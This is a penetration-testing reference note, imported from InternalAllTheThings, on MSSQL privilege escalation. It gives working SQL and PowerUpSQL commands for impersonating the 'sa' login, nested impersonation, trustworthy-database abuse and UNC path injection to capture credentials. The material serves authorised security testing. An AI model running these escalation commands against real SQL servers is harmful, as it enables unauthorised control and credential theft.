---
title: MSSQL - Audit Checks
type: technique
tags: [database, enumeration, mssql, reference-import, windows]
phase: enumeration
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# MSSQL - Audit Checks

## What it is

Technical reference for **MSSQL - Audit Checks** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

MSSQL audit checks identify privilege escalation vectors within SQL Server by testing for impersonation opportunities (`EXECUTE AS LOGIN`), trustworthy database abuse, and overly permissive server roles. An attacker who can impersonate the `sa` or `dbo` login escalates to `sysadmin` rights within the SQL instance, enabling command execution and credential access. Trustworthy databases allow contained database users to execute code as the owning login, providing another escalation path when the database owner is `sa` or a high-privilege login.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Summary

* [Impersonation Opportunities](#impersonation-opportunities)
    * [Exploiting Impersonation](#exploiting-impersonation)
    * [Exploiting Nested Impersonation](#exploiting-nested-impersonation)
* [Trustworthy Databases](#trustworthy-databases)

## Impersonation Opportunities

* Impersonate as: `EXECUTE AS LOGIN = 'sa'`
* Impersonate `dbo` with DB_OWNER

```sql
SQL> select is_member('db_owner');
SQL> execute as user = 'dbo'
SQL> SELECT is_srvrolemember('sysadmin')
```

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```

### Exploiting Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

### Exploiting Nested Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

## Trustworthy Databases

```sql
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 

SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
```

> The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.

```ps1
Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
